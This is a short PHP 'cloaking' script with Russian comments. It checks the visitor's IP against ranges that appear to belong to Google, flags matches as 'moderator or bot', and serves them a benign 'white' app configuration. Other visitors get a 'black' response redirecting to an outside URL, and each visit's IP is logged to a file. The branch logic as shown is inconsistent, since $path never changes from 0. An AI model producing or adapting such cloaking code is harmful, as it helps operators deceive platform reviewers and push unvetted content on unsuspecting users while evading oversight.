<?php
include('iprangeblock.php');
$path = 0;
$pathurl = 'white';
$visit_date = date("d-m-Y H:i:s");
$info = "IP: ".$_SERVER['REMOTE_ADDR'];
$url1 = 'https://yahoo.com';
$url2 = 'https://facebook.com';

// Показать рабочий поток если в ссылке есть нужный параметр
if (isset($_GET['utm_source'])){
	$marker = $_GET['utm_source'];
}
if ($marker == 'test'){	
	$path = 0;
}

// клоака по ip гугла
if(foreachip($_SERVER['REMOTE_ADDR'])){
	$path = 0;
	$whoisit = 'moderator or bot';
} else {
	$whoisit = 'user';
}

if($path == 0){
	$pathurl = 'go to white';
	$data = array(
		'userID' => 'noUserID',
		'access' => 'true',
		'new_user' => 'yes',
		'RRR' => array (
				'fftg' => 'skmdc',
				'dlmfvklm' => 'alksmxlsd'
		),
		'path' => 'app'
	);
} else {
	$pathurl = 'go to black';
	$data = array(
		'userID' => 'noUserID',
		'access' => 'true',
		'new_user' => 'yes',
		'goto' => $url1
	);
}

file_put_contents('clicklog.txt', $visit_date."\r\n".$info."\r\nWho = ".$whoisit."\r\nURL = ".$pathurl."\r\n\r\n\r\n", FILE_APPEND);

echo json_encode($data);
?>
